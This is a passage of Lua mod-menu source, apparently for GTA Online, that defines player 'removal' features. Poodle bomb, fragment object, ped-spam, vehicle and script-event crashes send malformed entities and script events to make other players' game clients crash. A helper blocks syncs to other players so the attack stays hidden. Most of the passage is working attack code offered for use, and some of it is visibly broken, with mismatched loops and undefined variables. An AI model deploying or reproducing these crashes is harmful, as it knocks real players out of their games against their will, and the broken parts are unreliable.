                            end
                            for i = 1, ped_amount do
                                ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], true)
                                PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds20[i], 3, 0, 1, 0)
                                util.yield()
                            end
                            util.yield(500)
                            for i = 1, ped_amount do
                                entities.delete(SpawnedPeds20[i])
                                util.yield(5)					
                            end
                        end
                    end
                end
            end
        end
    end
end)

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local poodlecrash = menu.list(Removals_List, "Poodle Bomb Crash", {}, "")

menu.action(poodlecrash, "Poodle Bomb Crash", {"poodle"}, "Skidded from Jinx.", function()
        local mdl = util.joaat('a_c_poodle')
            BlockSyncs(pid, function()
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped1)
                util.yield(1)
        else
                util.toast("Failed to load model. :/")
notification("Worth it HAHA!!!", colors.red)
        end
    end)
end)

menu.toggle_loop(poodlecrash, "Poodle Bomb Crash", {"togglepoodle"}, "Skidded from Jinx.", function(on_toggle)
        local mdl = util.joaat('a_c_poodle')
            BlockSyncs(pid, function()
            if request_model(mdl, 2) then
                local pos = players.get_position(pid)
                util.yield(1)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped1)
                util.yield(1)
        else
                util.toast("Failed to load model. :/")
notification("Worth it HAHA!!!", colors.red)
        end
    end)
end)

    menu.toggle_loop(poodlecrash, "Poodle Crash V2", {"poodlev2"}, "Skidded from Jinx then x6 by Candy.", function(on_loop)
        notification("Poodle Crash V2 sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
--Locals
        local mdl = util.joaat('a_c_poodle')
        local mdl1 = util.joaat('a_c_poodle')
        local mdl2 = util.joaat('a_c_poodle')
        BlockSyncs(pid, function()
        if request_model(mdl, mdl1, mdl2, 2) then
                local pos = players.get_position(pid)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local ped1 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local ped2 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
---------------------------------------------------------------------------------------------------------------------
--mdl GIVE WEAPON TO PED

                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 3, 0, 0), 0)
ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), -3, 0, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--mdl1 GIVE WEAPON TO PED

                ped2 = entities.create_ped(26, mdl1, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                ped2 = entities.create_ped(26, mdl1, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, -3, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped2, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped2, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--mdl2 GIVE WEAPON TO PED

                ped2 = entities.create_ped(26, mdl2, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 3), 0)
                ped2 = entities.create_ped(26, mdl2, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, -3), 0) 
                local coords = ENTITY.GET_ENTITY_COORDS(ped2, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped2, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--mdl DETACH ENTITY & ADD EXPLOSION

                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(0)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped1)
                util.yield(0)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--mdl1 DETACH ENTITY & ADD EXPLOSION

                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped2, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(0)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped2)
                util.yield(0)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--mdl2 DETACH ENTITY & ADD EXPLOSION

                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped2, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(0)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped2)
                util.yield(0)
end
    end)
end)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local function BlockSyncs(pid, callback)
for _, i in ipairs(players.list(false, true, true)) do
    if i ~= pid then
        local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
        menu.trigger_command(outSync, "on")
    end
end
util.yield(10)
callback()
for _, i in ipairs(players.list(false, true, true)) do
    if i ~= pid then
        local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
        menu.trigger_command(outSync, "off")
    end
end
end

local fragcrash = menu.list(Removals_List, "Fragment Crash", {}, "")

menu.toggle_loop(fragcrash, "Fragment Crash V1", {"togglefragv1"}, "Skidded From 2take1", function(on_toggle)
BlockSyncs(pid, function()
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        util.yield(1000)
        entities.delete_by_handle(object)
    end)
end)

menu.toggle_loop(fragcrash, "Fragment Crash V2", {"togglefragv2"}, "", function(on_toggle)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    for i = 0, 100 do 
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    util.yield(10)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza2)
    return
end
end)

menu.toggle(fragcrash, "Fragment Crash V3", {"togglefragv3"}, "", function(on_toggle)
    notification("Fragment Crash V3 sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
if on_toggle then
        menu.trigger_commands("togglefragv1" .. players.get_name(pid))
        menu.trigger_commands("togglefragv2" .. players.get_name(pid))
else
        menu.trigger_commands("togglefragv1" .. players.get_name(pid))
        menu.trigger_commands("togglefragv2" .. players.get_name(pid))
        menu.trigger_commands("superc")
    end

end)


local krustykrab = menu.list(Removals_List, "2take1 Special", {}, "It's risky to spectate using this but your call, works best on 2take1 users")

local peds = 5
menu.slider(krustykrab, "Number Of Spatchulas", {"nos2t1"}, "Sends spatchula crash. Note: Flick it to 45 click to crash then flick back to 1 and click again for best results", 1, 45, 1, 1, function(amount)
notification("2take1 Special sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(krustykrab, "2take1 Special", {"2t1spec"}, "It's risky to spectate using this but your call", function(val)
notification("Sending 2take1 Special to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    crash_toggle = val
    BlockSyncs(pid, function()
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("ig_siemonyetarian")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, false)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_BBQ", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_fish_slice_01") then
                        entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
    end)
end)


local vehcrash = menu.list(Removals_List, "Vehicle Crash", {}, "")

    menu.action(vehcrash, "Vehicle Crash", {"vehcrash"}, "Sends them with a few car trolls then ton of op crash events starting with car crash events", function()
    notification("Vehicle Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    util.yield(1500)
    local hash = util.joaat("baller")
    local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if STREAMING.IS_MODEL_A_VEHICLE(hash) then
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            util.yield()
        end
        local Coords1 = PlayerCoords.y + 10
        local Coords2 = PlayerCoords.y - 10
        local veh1 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords1, PlayerCoords.z, 180, true, false, true)
        local veh2 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords2, PlayerCoords.z, 0, true, false, true)
        -- Do stuff with veh ...
        ENTITY.SET_ENTITY_VELOCITY(veh1, 0, -100, 0)
        ENTITY.SET_ENTITY_VELOCITY(veh2, 0, 100, 0)
    end
menu.trigger_commands("killveh" .. players.get_name(pid))
menu.trigger_commands("poptires" .. players.get_name(pid))
menu.trigger_commands("removedoors" .. players.get_name(pid))
menu.trigger_commands("slingshot" .. players.get_name(pid))
menu.trigger_commands("igniteveh" .. players.get_name(pid))
menu.trigger_commands("vehkick" .. players.get_name(pid))
menu.trigger_commands("novehs" .. players.get_name(pid))
menu.trigger_commands("delveh" .. players.get_name(pid))
menu.trigger_commands("slaughter" .. PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
    util.yield(100)
menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("2t1spec" .. PLAYER.GET_PLAYER_NAME(pid))
            end)

    menu.toggle_loop(vehcrash, "Vehicle Crash", {"togglevehcrash"}, "Sends them with a few car trolls then ton of op crash events starting with car crash events", function(on_toggle)
    notification("Vehicle Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    util.yield(1500)
    local hash = util.joaat("baller")
    local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if STREAMING.IS_MODEL_A_VEHICLE(hash) then
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            util.yield()
        end
        local Coords1 = PlayerCoords.y + 10
        local Coords2 = PlayerCoords.y - 10
        local veh1 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords1, PlayerCoords.z, 180, true, false, true)
        local veh2 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords2, PlayerCoords.z, 0, true, false, true)
        -- Do stuff with veh ...
        ENTITY.SET_ENTITY_VELOCITY(veh1, 0, -100, 0)
        ENTITY.SET_ENTITY_VELOCITY(veh2, 0, 100, 0)
    end
menu.trigger_commands("killveh" .. players.get_name(pid))
menu.trigger_commands("poptires" .. players.get_name(pid))
menu.trigger_commands("removedoors" .. players.get_name(pid))
menu.trigger_commands("slingshot" .. players.get_name(pid))
menu.trigger_commands("igniteveh" .. players.get_name(pid))
menu.trigger_commands("vehkick" .. players.get_name(pid))
menu.trigger_commands("novehs" .. players.get_name(pid))
menu.trigger_commands("delveh" .. players.get_name(pid))
menu.trigger_commands("slaughter" .. PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("crash"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("ngcrash"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("footlettuce"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("2t1spec"..PLAYER.GET_PLAYER_NAME(pid))
menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 100")
menu.trigger_commands("nos2t1".. players.get_name(pid) .. " 1")
    util.yield(100)
menu.trigger_commands("poodle"..PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("2t1spec" .. PLAYER.GET_PLAYER_NAME(pid))
            end)
            

            local scrash = menu.list(Removals_List, "Script Event Crashes", {}, "")

            menu.toggle_loop(scrash, "SE Crash (S0)", {"crashs0"}, "A very strong SE/SH crash", function(on_toggle)
            notification("SE Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                    local int_min = -2147483647
                    local int_max = 2147483647
                        for i = 1, 15 do
                            util.trigger_script_event(1 << pid, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561, math.random(int_min, int_max), math.random(int_min, int_max), 
                            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                            math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                            util.trigger_script_event(1 << pid, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561})
                        end
                        util.yield()
                        for i = 1, 15 do
                            util.trigger_script_event(1 << pid, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561, pid, math.random(int_min, int_max)})
                            util.trigger_script_event(1 << pid, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561})
                        end
                menu.trigger_commands("givesh" .. players.get_name(pid))
                    util.trigger_script_event(1 << pid, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561})
                        end)
        
            menu.toggle_loop(scrash, "SE Crash (S1)", {"crashs1"}, "A very strong SE/SH crash", function(on_toggle)
            notification("SE Crash (S1) sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                    local int_min = -2147483647
                    local int_max = 2147483647
                        for i = 1, 15 do
                        util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
                            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                            math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                        util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
                        end
                        util.yield()
                        for i = 1, 15 do
                        util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, pid, math.random(int_min, int_max)})
                        util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
                        end
                menu.trigger_commands("givesh" .. players.get_name(pid))
                        util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
                notification("SE Crashed (S1) " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                        end)
        
                menu.toggle_loop(scrash, "SE Crash (S2)", {"crashs2"}, "A very strong SE/SH crash", function(on_toggle)
                notification("SE Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                    local int_min = -2147483647
                    local int_max = 2147483647
                        for i = 1, 15 do
                            util.trigger_script_event(1 << pid, {495813132, 23, -1022833023, -1030266475, 1113137152, 1116527247, 274946574, 828030307, math.random(int_min, int_max), math.random(int_min, int_max), 
                            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                            math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                            util.trigger_script_event(1 << pid, {495813132, 23, -1022833023, -1030266475, 1113137152, 1116527247, 274946574, 828030307})
                        end
                        util.yield()
                        for i = 1, 15 do
                            util.trigger_script_event(1 << pid, {495813132, 23, -1022833023, -1030266475, 1113137152, 1116527247, 274946574, 828030307, pid, math.random(int_min, int_max)})
                            util.trigger_script_event(1 << pid, {495813132, 23, -1022833023, -1030266475, 1113137152, 1116527247, 274946574, 828030307})
                        end
                menu.trigger_commands("givesh" .. players.get_name(pid))
                util.trigger_script_event(1 << pid, {495813132, 23, -1022833023, -1030266475, 1113137152, 1116527247, 274946574, 828030307})
                    end)
        
                menu.toggle_loop(scrash, "SE Crash (S3)", {"crashs3"}, "A very strong SE/SH crash", function(on_toggle)
                notification("SE Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                        local int_min = -2147483647
                        local int_max = 2147483647
                            for i = 1, 15 do
                                util.trigger_script_event(1 << pid, {1348481963, 0, -124605528, math.random(int_min, int_max), math.random(int_min, int_max), 
                                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                                util.trigger_script_event(1 << pid, {1348481963, 0, -124605528})
                            end
                            util.yield()
                            for i = 1, 15 do
                                util.trigger_script_event(1 << pid, {1348481963, 0, -124605528, pid, math.random(int_min, int_max)})
                                util.trigger_script_event(1 << pid, {1348481963, 0, -124605528})
                            end
                menu.trigger_commands("givesh" .. players.get_name(pid))
                        util.trigger_script_event(1 << pid, {1348481963, 0, -124605528})
                            end)
        
                menu.toggle_loop(scrash, "SE Crash (S4)", {"crashs4"}, "A very strong SE/SH crash", function(on_toggle)
                notification("SE Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                        local int_min = -2147483647
                        local int_max = 2147483647
                            for i = 1, 15 do
                                util.trigger_script_event(1 << pid, {-1178972880, 1, 3, 8, 1, 1, 1, math.random(int_min, int_max), math.random(int_min, int_max), 
                                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                                util.trigger_script_event(1 << pid, {-1178972880, 1, 3, 8, 1, 1, 1})
                            end
                            util.yield()
                            for i = 1, 15 do
                                util.trigger_script_event(1 << pid, {-1178972880, 1, 3, 8, 1, 1, 1, pid, math.random(int_min, int_max)})
                                util.trigger_script_event(1 << pid, {-1178972880, 1, 3, 8, 1, 1, 1})
                                end
                menu.trigger_commands("givesh" .. players.get_name(pid))
                        util.trigger_script_event(1 << pid, {-1178972880, 1, 3, 8, 1, 1, 1})
                                end)

--[[

                menu.toggle_loop(scrash, "SE Crash (S5)", {"crashs5"}, "A very strong SE/SH crash", function(on_toggle)
                    notification("SE Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                            local int_min = -2147483647
                            local int_max = 2147483647
                                for i = 1, 15 do
                                    util.trigger_script_event(1 << pid, {1670832796, 17, 8389765640730081662, 3612517357159281440, 1195254326, -1315771977, -425873691, -1164711529, -1528456516, 177617928821990, 0, 0, 3141616568656, math.random(int_min, int_max), math.random(int_min, int_max), 
                                    math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                                    math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                                    util.trigger_script_event(1 << pid, {1670832796, 17, 8389765640730081662, 3612517357159281440, 1195254326, -1315771977, -425873691, -1164711529, -1528456516, 177617928821990, 0, 0, 3141616568656})
                                end
                                util.yield()
                                for i = 1, 15 do
                                    util.trigger_script_event(1 << pid, {1670832796, 17, 8389765640730081662, 3612517357159281440, 1195254326, -1315771977, -425873691, -1164711529, -1528456516, 177617928821990, 0, 0, 3141616568656, pid, math.random(int_min, int_max)})
                                    util.trigger_script_event(1 << pid, {1670832796, 17, 8389765640730081662, 3612517357159281440, 1195254326, -1315771977, -425873691, -1164711529, -1528456516, 177617928821990, 0, 0, 3141616568656})
                                    end
                    menu.trigger_commands("givesh" .. players.get_name(pid))
                            util.trigger_script_event(1 << pid, {1670832796, 17, 8389765640730081662, 3612517357159281440, 1195254326, -1315771977, -425873691, -1164711529, -1528456516, 177617928821990, 0, 0, 3141616568656})
                                    end)
]]       
                                
                menu.toggle_loop(scrash, "SE Crash (S7)", {"crashs7"}, "A very strong SE/SH crash", function(on_toggle)
                notification("SE Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                        local int_min = -2147483647
                        local int_max = 2147483647
